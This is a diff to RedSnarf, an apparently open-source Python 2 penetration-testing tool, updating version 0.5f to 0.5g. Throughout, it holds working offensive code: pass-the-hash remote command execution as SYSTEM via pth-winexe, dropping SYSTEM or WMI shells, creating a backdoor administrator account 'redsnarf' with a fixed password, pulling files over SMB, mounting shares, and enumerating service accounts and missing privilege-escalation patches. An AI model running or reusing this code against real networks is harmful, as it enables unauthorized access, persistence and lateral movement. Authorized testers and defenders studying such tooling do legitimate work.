@@ -1118,7 +1118,9 @@ def datadump(user, passw, host, path, os_version):
 			if xcommand!='n':
 				try:
 					print colored("[+]Running Command: "+xcommand,'green')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+xcommand+"\" 2>/dev/null")
+					#Escapes string properly								
+					command = xcommand.encode('string-escape').replace('"', '\\"')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
 				except:
 					print colored("[-]Something went wrong ...",'red')
 					logging.error("[-]Something went wrong running custom command")
@@ -1143,6 +1145,10 @@ def datadump(user, passw, host, path, os_version):
 							if command[0:8]=="command=":
 								command=command[8:len(command)]
 								print colored("[+]Executing Command ",'yellow')+command
+								
+								#Escapes string properly								
+								command = command.encode('string-escape').replace('"', '\\"')
+
 								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
 						
 						elif line[0:8]=="[upload]":
@@ -1187,13 +1193,11 @@ def datadump(user, passw, host, path, os_version):
 							remotedir=download[0]
 							if remotedir[0:10]=="remotedir=":
 								remotedir=remotedir[10:len(remotedir)]
-								#print remotedir
-
+								
 							remfile=download[1]
 							if remfile[0:8]=="remfile=":
 								remfile=remfile[8:len(remfile)]
-								#print remfile
-														
+																						
 							if remotedir=='none':
 								print colored("[+]Downloading ",'yellow')+remfile
 								os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+remfile+"\' 2>/dev/null")
@@ -1210,6 +1214,10 @@ def datadump(user, passw, host, path, os_version):
 							if chkfile[0:5]=="file=":
 								chkfile=chkfile[5:len(chkfile)]
 								print colored("[+]Checking for file ",'yellow')+chkfile
+								
+								#Escapes string properly
+								chkfile = chkfile.encode('string-escape').replace('"', '\\"')
+
 								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c dir "+chkfile+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 								stdout_value = proc.communicate()[0]
 																
@@ -1225,6 +1233,10 @@ def datadump(user, passw, host, path, os_version):
 								chkdir=chkdir[4:len(chkdir)]
 								
 								print colored("[+]Checking for dir ",'yellow')+chkdir
+								
+								#Escapes string properly
+								chkdir = chkdir.encode('string-escape').replace('"', '\\"')
+
 								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c dir "+chkdir+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 								stdout_value = proc.communicate()[0]
 																
@@ -2130,7 +2142,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5f", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5g", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -2641,120 +2653,154 @@ elif remotetargets[0:8]=='nmapxml=':
 	print colored("[+]Parsed Nmap output and found "+str(len(targets))+" target(s) in xml file\n",'yellow')
 
 #Function runs windows Base Line Analyser on a remote machine to get patch status.
-if windows_updates in yesanswers:
+if windows_updates != 'n':
+	if windows_updates in yesanswers:
 	
-	#Parse XML for Missing Patches
-	privesc=["MS17-010","MS16-135","MS16-032","MS16-016","MS15-051","MS14-058","MS14-040","MS14-002","MS13-005","MS10-092","MS10-015","MS14-002","MS15-061","MS11-080","MS11-062","MS15-076","MS16-075","MS15-010","MS11-046","MS10-015","MS10-092","MS13-053","MS13-081","MS14-058","MS15-051","MS15-078","MS16-016","MS16-032"];
-	missingpatches = []
-	dirty = "false"
-	output="./wupdate/wsusscn2.cab"
-	
-	if not os.path.exists(output):
-		print colored("\n[+]Checking Dependancies",'yellow')
-		print colored("[-]wsusscn2.cab is missing...",'red')
-		print colored("[+]Downloading wsusscn2.cab",'green')
-		file_url = 'http://go.microsoft.com/fwlink/?LinkId=76054'
-		file_name = wget.download(file_url, out="./wupdate/wsusscn2.cab")
-	
-	if os.path.exists(output):
-		print colored("\n[+]Checking Dependancies",'yellow')
-
-		print colored("[+]The file stamp on wsusscn2.cab is ",'green')+colored("created: %s" % time.ctime(os.path.getctime(output)),'white')
-		print colored("[+]For best results wsusscn2.cab needs to be as up to date as possible\n",'yellow')
+		#Parse XML for Missing Patches
+		privesc=["MS17-010","MS16-135","MS16-032","MS16-016","MS15-051","MS14-058","MS14-040","MS14-002","MS13-005","MS10-092","MS10-015","MS14-002","MS15-061","MS11-080","MS11-062","MS15-076","MS16-075","MS15-010","MS11-046","MS10-015","MS10-092","MS13-053","MS13-081","MS14-058","MS15-051","MS15-078","MS16-016","MS16-032"];
+		missingpatches = []
+		dirty = "false"
+		output="./wupdate/wsusscn2.cab"
 		
-		response=raw_input("Do you want to download a new copy now? (y/n) " )
-		
-		if response in yesanswers:
-			os.unlink("./wupdate/wsusscn2.cab")
+		if not os.path.exists(output):
+			print colored("\n[+]Checking Dependancies",'yellow')
+			print colored("[-]wsusscn2.cab is missing...",'red')
 			print colored("[+]Downloading wsusscn2.cab",'green')
 			file_url = 'http://go.microsoft.com/fwlink/?LinkId=76054'
 			file_name = wget.download(file_url, out="./wupdate/wsusscn2.cab")
+		
+		if os.path.exists(output):
+			print colored("\n[+]Checking Dependancies",'yellow')
 
-	if not os.path.exists(outputpath+targets[0]):
-		os.makedirs(outputpath+targets[0])
-		print colored("\n[+]Creating directory for host: "+targets[0],'green')
+			print colored("[+]The file stamp on wsusscn2.cab is ",'green')+colored("created: %s" % time.ctime(os.path.getctime(output)),'white')
+			print colored("[+]For best results wsusscn2.cab needs to be as up to date as possible\n",'yellow')
+			
+			response=raw_input("Do you want to download a new copy now? (y/n) " )
+			
+			if response in yesanswers:
+				os.unlink("./wupdate/wsusscn2.cab")
+				print colored("[+]Downloading wsusscn2.cab",'green')
+				file_url = 'http://go.microsoft.com/fwlink/?LinkId=76054'
+				file_name = wget.download(file_url, out="./wupdate/wsusscn2.cab")
 
-	print colored("\n[+]Uploading Files",'yellow')
-	proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put mbsacli.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
-	proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wusscan.dll\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
-	proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wsusscn2.cab\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		if not os.path.exists(outputpath+targets[0]):
+			os.makedirs(outputpath+targets[0])
+			print colored("\n[+]Creating directory for host: "+targets[0],'green')
+
+		print colored("\n[+]Uploading Files",'yellow')
+		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put mbsacli.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wusscan.dll\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wsusscn2.cab\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \'cmd.exe /C dir c:\\ \' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+		result=proc.communicate()[0]		
+		if "mbsacli.exe" not in result or "wusscan.dll" not in result or "wsusscn2.cab" not in result:
+			print colored("[-]Something has gone wrong uploading files..\n",'red')
+			sys.exit()
+
+		print colored("[+]Checking Updates, be patient this can take a while....\n",'yellow')
+
+		print colored("[+]Good time to grab a Coffee, \n",'green')
+		print colored("	   {",'red')
+		print colored("        {   }",'red')
+		print colored("       }_{ __{",'red')
+		print colored("    .-{   }   }-.",'red')
+		print colored("   (   }     {   )",'red')
+		print colored("   |`-.._____..-'|",'red')
+		print colored("   |             ;--.",'red')
+		print colored("   |            (__  \\",'red')
+		print colored("   |     NCC     | )  )",'red')
+		print colored("   |    Group    |/  /",'red')
+		print colored("   |             /  /    ",'red')
+		print colored("   |    2017    (  /",'red')
+		print colored("   \             y'",'red')
+		print colored("    `-.._____..-'\n\n",'red')
+
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"cmd.exe /C c:\\mbsacli.exe /xmlout /catalog c:\\wsusscn2.cab /nvc > c:\\results.xml \" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()		
+
+		print colored("[+]Getting Results",'yellow')
+		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get results.xml"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+		
+		if os.path.exists(outputpath+targets[0]+"/results.xml"):
+			print colored("[+]Results saved to ",'yellow')+colored(outputpath+targets[0]+"/results.xml",'green')
+		else:
+			print colored("[+]Failed to get updates...",'red')
+
+		print colored("[+]Cleaning Up\n",'yellow')
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\results.xml c:\\wsusscn2.cab.dat c:\\wsusscn2.cab c:\\mbsacli.exe c:\\wusscan.dll\" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
+
+		#Parse the xml
+		if os.path.exists(outputpath+targets[0]+"/results.xml"):
+			tree = ET.parse(outputpath+targets[0]+"/results.xml")
+			root = tree.getroot()
+			
+			for child in root:
+				if child.tag == "Check":
+					for step_child in child:
+						if step_child.tag == "Detail":
+							for step_step_child in step_child:
+								if step_step_child.tag == "UpdateData":
+									if step_step_child.get('IsInstalled')=="false":
+										for step_step_step_child in step_step_child:
+											if step_step_step_child.tag== "Title":
+												missingpatches.append(step_step_step_child.text+","+" BulletinID "+step_step_child.get('BulletinID') + ", KBID " + step_step_child.get('KBID')+ ", Severity " + step_step_child.get('Severity'))
+			
+			missingpatches=list(set(missingpatches))											
+			
+			if len(missingpatches)>0:
+				print colored("[+]Found some missing patches",'yellow')
+				print colored("[+]Any displayed below in red are priv esc vulnerabilities\n",'green')
+
+			for patches in missingpatches:
+				
+				for pesc in privesc:
+					if str(pesc) in patches:
+						dirty = "true"
+
+				if dirty == "false":
+					print patches
+				else:
+					print colored(patches,'red')			
+
+				dirty = "false"
+
+			print "\n\n"
+
+		sys.exit()
 	
-	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \'cmd.exe /C dir c:\\ \' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
-	result=proc.communicate()[0]		
-	if "mbsacli.exe" not in result or "wusscan.dll" not in result or "wsusscn2.cab" not in result:
-		print colored("[-]Something has gone wrong uploading files..\n",'red')
+	if windows_updates=="update":
+		
+		output="./wupdate/wsusscn2.cab"
+	
+		if not os.path.exists(output):
+			print colored("\n[+]Microsoft wsusscn2.cab Updater",'yellow')
+			print colored("[-]wsusscn2.cab is missing...",'red')
+			print colored("[+]Downloading wsusscn2.cab",'green')
+			file_url = 'http://go.microsoft.com/fwlink/?LinkId=76054'
+			file_name = wget.download(file_url, out="./wupdate/wsusscn2.cab")
+			print "\n"
+			sys.exit()
+		
+		if os.path.exists(output):
+			print colored("\n[+]Microsoft wsusscn2.cab Updater",'yellow')
+			print colored("\n[+]Checking Dependancies",'yellow')
+
+			print colored("[+]The file stamp on wsusscn2.cab is ",'green')+colored("created: %s" % time.ctime(os.path.getctime(output)),'white')
+			print colored("[+]For best results wsusscn2.cab needs to be as up to date as possible\n",'yellow')
+			
+			response=raw_input("Do you want to download a new copy now? (y/n) " )
+			
+			if response in yesanswers:
+				os.unlink("./wupdate/wsusscn2.cab")
+				
+				print colored("[+]Downloading wsusscn2.cab",'green')
+				file_url = 'http://go.microsoft.com/fwlink/?LinkId=76054'
+				file_name = wget.download(file_url, out="./wupdate/wsusscn2.cab")
+				print "\n"
+		
 		sys.exit()
 
-	print colored("[+]Checking Updates, be patient this can take a while....\n",'yellow')
-
-	print colored("[+]Good time to grab a Coffee, \n",'green')
-	print colored("	   {",'red')
-	print colored("        {   }",'red')
-	print colored("       }_{ __{",'red')
-	print colored("    .-{   }   }-.",'red')
-	print colored("   (   }     {   )",'red')
-	print colored("   |`-.._____..-'|",'red')
-	print colored("   |             ;--.",'red')
-	print colored("   |            (__  \\",'red')
-	print colored("   |     NCC     | )  )",'red')
-	print colored("   |    Group    |/  /",'red')
-	print colored("   |             /  /    ",'red')
-	print colored("   |    2017    (  /",'red')
-	print colored("   \             y'",'red')
-	print colored("    `-.._____..-'\n\n",'red')
-
-	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"cmd.exe /C c:\\mbsacli.exe /xmlout /catalog c:\\wsusscn2.cab /nvc > c:\\results.xml \" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()		
-
-	print colored("[+]Getting Results",'yellow')
-	proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get results.xml"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
-	
-	if os.path.exists(outputpath+targets[0]+"/results.xml"):
-		print colored("[+]Results saved to ",'yellow')+colored(outputpath+targets[0]+"/results.xml",'green')
-	else:
-		print colored("[+]Failed to get updates...",'red')
-
-	print colored("[+]Cleaning Up\n",'yellow')
-	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\results.xml c:\\wsusscn2.cab.dat c:\\wsusscn2.cab c:\\mbsacli.exe c:\\wusscan.dll\" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()	
-
-	#Parse the xml
-	if os.path.exists(outputpath+targets[0]+"/results.xml"):
-		tree = ET.parse(outputpath+targets[0]+"/results.xml")
-		root = tree.getroot()
-		
-		for child in root:
-			if child.tag == "Check":
-				for step_child in child:
-					if step_child.tag == "Detail":
-						for step_step_child in step_child:
-							if step_step_child.tag == "UpdateData":
-								if step_step_child.get('IsInstalled')=="false":
-									for step_step_step_child in step_step_child:
-										if step_step_step_child.tag== "Title":
-											missingpatches.append(step_step_step_child.text+","+" BulletinID "+step_step_child.get('BulletinID') + ", KBID " + step_step_child.get('KBID')+ ", Severity " + step_step_child.get('Severity'))
-		
-		missingpatches=list(set(missingpatches))											
-		
-		if len(missingpatches)>0:
-			print colored("[+]Found some missing patches",'yellow')
-			print colored("[+]Any displayed below in red are priv esc vulnerabilities\n",'green')
-
-		for patches in missingpatches:
-			
-			for pesc in privesc:
-				if str(pesc) in patches:
-					dirty = "true"
-
-			if dirty == "false":
-				print patches
-			else:
-				print colored(patches,'red')			
-
-			dirty = "false"
-
-		print "\n\n"
-	
 	sys.exit()
-
 
 #Function looks for accounts which have delegated privs
 if delegated_privs in yesanswers:
@@ -4478,6 +4524,8 @@ if system_tasklist in yesanswers:
 
 #Routine will start a shell
 if dropshell in yesanswers:
+	allshares=[]
+
 	if len(targets)==1:
 		try:
 			if passw=="":
@@ -4489,8 +4537,12 @@ if dropshell in yesanswers:
 				print colored ('[+]Enter ','green')+ colored('n','yellow')+colored(' for a Shell with Privileges of ','green')+colored(user,'yellow')+" (default)"
 				print colored ('[+]Enter ','green')+ colored('w','yellow')+colored(' for a WMI based Shell','green')
 				print colored ('[+]Enter ','green')+ colored('a','yellow')+colored(' to create a new DA account with the credentials ','green')+colored('redsnarf','yellow')+colored('/','green')+colored('P@ssword1','yellow')+colored(' then Shell to this account\n','green')
+				print colored ('[+]Enter ','green')+ colored('SMB','yellow')+colored(' to connect to ','green')+colored('C$','yellow')+colored(' with SMBClient','green')
 
-				response = raw_input("What kind of shell would you like:? (q to quit) ")
+				if os.path.isfile(outputpath+targets[0]+'/shares.txt'):
+					print colored ('[+]Enter ','green')+ colored('SMBC','yellow')+colored(' to mount a share from ','green')+colored(outputpath+targets[0]+'/shares.txt','yellow')+colored(' with SMBClient','green')
+
+				response = raw_input("\nWhat kind of shell would you like:? (q to quit) ")
 				if response.upper()=="S":	
 					print colored ('\n[+] Dropping a SYSTEM Shell on '+targets[0]+'\n','yellow')
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
@@ -4509,6 +4561,32 @@ if dropshell in yesanswers:
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe /c net user redsnarf P@ssword1 /ADD && net localgroup Administrators redsnarf /ADD\" 2>/dev/null")
 					print colored ("Dropping a shell with the account ",'green')+colored("redsnarf",'yellow')+colored(" and password ",'green')+colored("P@ssword1\n",'yellow')
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+"redsnarf"+"%"+"P@ssword1"+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
+					sys.exit()
+				elif response.upper()=="SMB":
+					print colored ('\n[+] Connecting to C$ with SMBClient on '+targets[0] +'\n','yellow')
+					os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" 2>/dev/null")
+					sys.exit()
+				elif response.upper()=="SMBC":
+					print colored ('\n[+] Select a share ' +'\n','yellow')
+										
+					u = open(outputpath+targets[0]+'/shares.txt').read().splitlines()
+					for n in u:
+						if "READ/" in n:
+							allshares.append(n)
+					
+					allshares=list(set(allshares))
+					
+					for share in xrange(len(allshares)):
+						print "["+str(share)+"]"+allshares[share]
+
+					response = raw_input("\nEnter the number of the share you wish to connect to:? ")
+
+					cshare=allshares[int(response)].split(",")[0]	
+					
+					print colored("Mounting ",'yellow')+cshare+colored(" with SMBClient",'yellow')
+					
+					os.system("/usr/bin/pth-smbclient //"+targets[0]+"/"+cshare+" -W "+domain_name+" -U "+user+"%"+passw+" 2>/dev/null")
+					
 					sys.exit()
 				elif response.upper()=="Q":
 					sys.exit()
@@ -4582,63 +4660,92 @@ if user_desc in yesanswers:
 		sys.exit()
 
 #This enumerates accounts running services, we get the basics of this during normal enumeration however this function gets group memberships
-if service_accounts in yesanswers:
-	print colored("\n[+]Checking for services running as users: "+targets[0]+"\n",'yellow')
-	os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
-	os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get users.txt\' 2>/dev/null")
-	os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
-	res = os.stat(outputpath+targets[0]+"/users.txt").st_size > 3
-	if res==True:
-		try:
-			u = open(outputpath+targets[0]+"/users.txt").read().splitlines()
-			for n in u:
-				if n:
-					print colored("[+]Account Retrieved "+n,'yellow')
-					
-					#Get usernames and query domain for memberships
-					print colored("[+]Attempting to get account details "+n,'green')
-														
-					#First method net user account /domain to get account details may fail depending on what privs we have
-					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C net user "+n.split("\\")[1]+" /domain \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
-					stdout_value = proc.communicate()[0]
-					
-					#If it's succcessful print details to screen else try and get details via RPC enumeration
-					if "User name" in stdout_value:
-						print stdout_value
-					else:
-						print "[-]Unable to retrieve account details from DC using method, going to try using RPC \n"
+if service_accounts !='n':
+	if service_accounts in yesanswers:
+		print colored("\n[+]Checking for services running as users: "+targets[0]+"\n",'yellow')
+		os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
+		os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get users.txt\' 2>/dev/null")
+		os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
+		res = os.stat(outputpath+targets[0]+"/users.txt").st_size > 3
+		if res==True:
+			try:
+				u = open(outputpath+targets[0]+"/users.txt").read().splitlines()
+				for n in u:
+					if n:
+						print colored("[+]Account Retrieved "+n,'yellow')
 						
-						#Get Group Membership using RPC to enumerate details
-						print colored("[+]Attempting to retrieve Group Membership via RPC",'green')
-						
-						#Get DC ip from domain name
-						dcip=socket.gethostbyname(domain_name)
-
-						#Query RPC for user details
-						proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryuser "+n.split("\\")[1]+"\"", stdout=subprocess.PIPE,shell=True)
+						#Get usernames and query domain for memberships
+						print colored("[+]Attempting to get account details "+n,'green')
+															
+						#First method net user account /domain to get account details may fail depending on what privs we have
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C net user "+n.split("\\")[1]+" /domain \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 						stdout_value = proc.communicate()[0]
 						
-						#Cycle through output
-						for line in stdout_value.splitlines():
-							#If we hit a user_rid line grab info and queryusergroups
-							if "user_rid" in line:
-								proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryusergroups "+line[12:len(line)]+"\"", stdout=subprocess.PIPE,shell=True)
-								stdout_value = proc.communicate()[0]
-								#Cycle output											
-								for grid in stdout_value.splitlines():
-									#If we hit group rid, grab info and querygroup to get full information
-									if "group rid" in grid:
-										proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"querygroup "+grid[12:17].lstrip()+"\"", stdout=subprocess.PIPE,shell=True)
-										stdout_value = proc.communicate()[0]
-										#This (should) print Group Memberships to screen
-										print stdout_value
+						#If it's succcessful print details to screen else try and get details via RPC enumeration
+						if "User name" in stdout_value:
+							print stdout_value
+						else:
+							print "[-]Unable to retrieve account details from DC using method, going to try using RPC \n"
+							
+							#Get Group Membership using RPC to enumerate details
+							print colored("[+]Attempting to retrieve Group Membership via RPC",'green')
+							
+							#Get DC ip from domain name
+							dcip=socket.gethostbyname(domain_name)
 
+							#Query RPC for user details
+							proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryuser "+n.split("\\")[1]+"\"", stdout=subprocess.PIPE,shell=True)
+							stdout_value = proc.communicate()[0]
+							
+							#Cycle through output
+							for line in stdout_value.splitlines():
+								#If we hit a user_rid line grab info and queryusergroups
+								if "user_rid" in line:
+									proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryusergroups "+line[12:len(line)]+"\"", stdout=subprocess.PIPE,shell=True)
+									stdout_value = proc.communicate()[0]
+									#Cycle output											
+									for grid in stdout_value.splitlines():
+										#If we hit group rid, grab info and querygroup to get full information
+										if "group rid" in grid:
+											proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"querygroup "+grid[12:17].lstrip()+"\"", stdout=subprocess.PIPE,shell=True)
+											stdout_value = proc.communicate()[0]
+											#This (should) print Group Memberships to screen
+											print stdout_value
 
-		except IOError as e:
-			print "I/O error({0}): {1}".format(e.errno, e.strerror)
+			except IOError as e:
+				print "I/O error({0}): {1}".format(e.errno, e.strerror)
+		else:
+			print colored("[-]No service accounts found: "+targets[0],'red')	
+			logging.info("[-]No service accounts found: "+targets[0])
 	else:
-		print colored("[-]No service accounts found: "+targets[0],'red')	
-		logging.info("[-]No service accounts found: "+targets[0])
+		#Undocumented
+		#Get usernames and query domain for memberships
+		print colored("[+]Attempting to get account details ",'green')+service_accounts
+			
+		#Get Group Membership using RPC to enumerate details
+		print colored("[+]Attempting to retrieve Group Membership via RPC",'green')
+		
+		#Get DC ip from domain name
+		dcip=socket.gethostbyname(domain_name)
+
+		#Query RPC for user details
+		proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryuser "+service_accounts+"\"", stdout=subprocess.PIPE,shell=True)
+		stdout_value = proc.communicate()[0]
+		
+		#Cycle through output
+		for line in stdout_value.splitlines():
+			#If we hit a user_rid line grab info and queryusergroups
+			if "user_rid" in line:
+				proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"queryusergroups "+line[12:len(line)]+"\"", stdout=subprocess.PIPE,shell=True)
+				stdout_value = proc.communicate()[0]
+				#Cycle output											
+				for grid in stdout_value.splitlines():
+					#If we hit group rid, grab info and querygroup to get full information
+					if "group rid" in grid:
+						proc = subprocess.Popen("rpcclient "+dcip+" -U "+user+"%"+passw+" -c \"querygroup "+grid[12:17].lstrip()+"\"", stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						#This (should) print Group Memberships to screen
+						print stdout_value
 
 	sys.exit()
 
